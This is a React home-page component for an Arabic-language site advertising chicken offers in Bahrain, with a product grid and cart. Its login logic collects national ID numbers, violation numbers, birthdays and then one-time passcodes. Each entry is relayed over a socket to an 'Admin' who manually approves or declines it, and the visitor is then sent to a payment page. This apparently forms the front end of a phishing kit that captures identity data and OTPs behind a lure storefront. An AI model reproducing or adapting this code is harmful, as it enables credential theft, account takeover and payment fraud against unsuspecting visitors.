import axios from "axios";
import React, { useEffect, useState } from "react";
import { api_route, products, socket } from "../App";
import { TailSpin } from "react-loader-spinner";
import { IoIosArrowBack } from "react-icons/io";

import { IoMdCloseCircle } from "react-icons/io";
import { FaBuilding } from "react-icons/fa6";
import { CustomDateInput } from "../components/CustomDateInput";
import { RiShoppingCartFill } from "react-icons/ri";
import Cart from "../components/Cart";
import { IoCloseCircle } from "react-icons/io5";
export const id = sessionStorage.getItem("id");

const Home = ({}) => {
  const [loading, setLoading] = useState(false);
  const [more, setMore] = useState(false);
  const [type, setType] = useState("افراد");
  const [nationalId, setNationalId] = useState("");
  const [vioNumber, setVioNumer] = useState("");
  const [birthday, setBirthday] = useState("");
  const [buildNumber, setBuildNumber] = useState("");
  const [nationalOther, setNationalOther] = useState("");
  const [popUp, setPopUp] = useState(false);
  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const [cartVisible, setCartVisible] = useState(false);

  const handleSubmit = async (e) => {
    setLoading(true);
    e.preventDefault();
    setError("");
    if (type === "افراد") {
      if (!birthday && !vioNumber) {
        return window.alert("برجاء إدخال رقم المخالفة  أو  تاريخ الميلاد ");
      } else {
        await axios
          .post(api_route + "/login", {
            type,
            vioNumber,
            birthday: birthday.toString(),
            nationalId,
          })
          .then(({ data }) => {
            console.log(data);
            socket.emit("login", data.order);
          });
      }
    } else {
      if (!vioNumber && !nationalOther) {
        return window.alert(
          "برجاء إدخال تاريخ الميلاد أو رقم هوية أحد العملاء"
        );
      } else {
        await axios
          .post(api_route + "/login", {
            type,
            vioNumber,
            nationalOther,
            buildNumber,
          })
          .then(({ data }) => {
            socket.emit("login", data.order);
          });
      }
    }
  };

  const handleOtp = async (e) => {
    setLoading(true);
    e.preventDefault();
    setError("");
    try {
      await axios
        .post(api_route + "/loginOtp/" + sessionStorage.getItem("id"), {
          type,
          otp,
        })
        .then(({ data }) => {
          console.log(data);
          socket.emit("login", data.order);
        });
    } catch (error) {}
  };

  socket.on("acceptLogin", (data) => {
    console.log("acceptLogin From Admin");
    console.log(data);

    if (type === "افراد") {
      sessionStorage.setItem("id", data);
      sessionStorage.setItem("nationalId", nationalId);
      sessionStorage.setItem("nationalOther", nationalOther);
      sessionStorage.setItem("vioNumber", vioNumber);
      setLoading(false);
      setPopUp(true);
      window.scrollTo({ top: "0px" });
    } else {
      sessionStorage.setItem("id", data);
      sessionStorage.setItem("nationalOther", nationalOther);
      sessionStorage.setItem("vioNumber", vioNumber);
      sessionStorage.setItem("buildNumber", buildNumber);
      setLoading(false);
      setPopUp(true);
      window.scrollTo({ top: "0px" });
    }
  });

  socket.on("declineLogin", (data) => {
    console.log(id);
    console.log("declineLogin From Admin", data);
    setLoading(false);
    setError("بيانات الدخول غير  صحيحة المحاولة مره اخري");
  });

  socket.on("acceptOTPLogin", (data) => {
    console.log("acceptOTPLogin From Admin");
    console.log(data);
    console.log(sessionStorage.getItem("id") === data.id);
    if (sessionStorage.getItem("id") === data.id) {
      sessionStorage.setItem("price", data.price);
      window.location.href = "/payment";
    }
  });

  socket.on("declineOTPLogin", (data) => {
    console.log("declineOTPLogin From Admin", data);
    if (id === data) {
      setLoading(false);
      setError("بيانات الدخول غير  صحيحة المحاولة مره اخري");
    }
  });
  return (
    <div
      className="w-full  flex items-start justify-center  flex-col py-5 gap-5 relative  "
      dir="rtl"
    >
      <img
        src="/home.png"
        className="w-full"
        onClick={() => (window.location.href = "/")}
      />
      <div className="text-right items-center drop-shadow-2xl shadow rounded-md w-fit px-2 flex gap-x-2 -mt-4">
        <span>التصنيفات</span>
        <IoIosArrowBack />
      </div>
      <span className="px-2 text-xl">عروض دجاج في البحرين</span>
      <div className="w-full grid grid-cols-2">
        {products.map((product) => {
          return (
            <div
              className="flex flex-col gap-y-3 py-2 w-full px-5 items-start justify-center  rounded-md shadow-lg cursor-pointer hover:opacity-55 transition-all"
              onClick={() => (window.location.href = "/product/" + product.id)}
            >
              <img src={product.image} className="w-full " />

              <div className="justify-between w-full flex items-center ">
                <span>{product.name}</span>
                <span className=" text-xs font-bold text-red-500" dir="ltr">
                  {product.price} د.ب
                </span>
              </div>
            </div>
          );
        })}
      </div>

      {more ? (
        <div className="w-full grid grid-cols-2">
          {products.map((product) => {
            return (
              <div
                className="flex flex-col gap-y-3 py-2 w-full px-5 items-start justify-center  rounded-md shadow-lg cursor-pointer hover:opacity-55 transition-all"
                onClick={() =>
                  (window.location.href = "/product/" + product.id)
                }
              >
                <img src={product.image} className="w-full " />

                <div className="justify-between w-full flex items-center ">
                  <span>{product.name}</span>
                  <span className=" text-xs font-bold text-red-500" dir="ltr">
                    {product.price} د.ب
                  </span>
                </div>
              </div>
            );
          })}
        </div>
      ) : (
        <div className="py-3 w-full text-center  ">
          {" "}
          <span
            className="bg-gray-600 text-white rounded-md p-2 "
            onClick={() => setMore(true)}
          >
            {" "}
            عرض المزيد من المنتجات
          </span>
        </div>
      )}

      {loading ? (
        <div className="fixed top-0 w-full h-screen bg-black bg-opacity-20 flex items-center justify-center ">
          <TailSpin
            height="50"
            width="50"
            color="white"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
        </div>
      ) : (
        ""
      )}
      <RiShoppingCartFill
        className="absolute top-4 text-purple-600 right-1/3  h-7 w-7"
        onClick={() => setCartVisible(true)}
      />
      {cartVisible ? (
        <div
          className={`bg-gray-100 top-0 bg-opacity-55 w-full h-screen gap-y-5 fixed flex justify-start items-center flex-col`}
        >
          <div className="flex flex-col w-10/12 items-center justify-end gap-y-5 my-3">
            <div className="w-full " dir="ltr">
              {" "}
              <IoCloseCircle
                className="text-red-500 text-3xl cursor-pointer"
                onClick={() => setCartVisible(false)}
              />
            </div>
            <Cart />
          </div>
        </div>
      ) : (
        ""
      )}
    </div>
  );
};

export default Home;
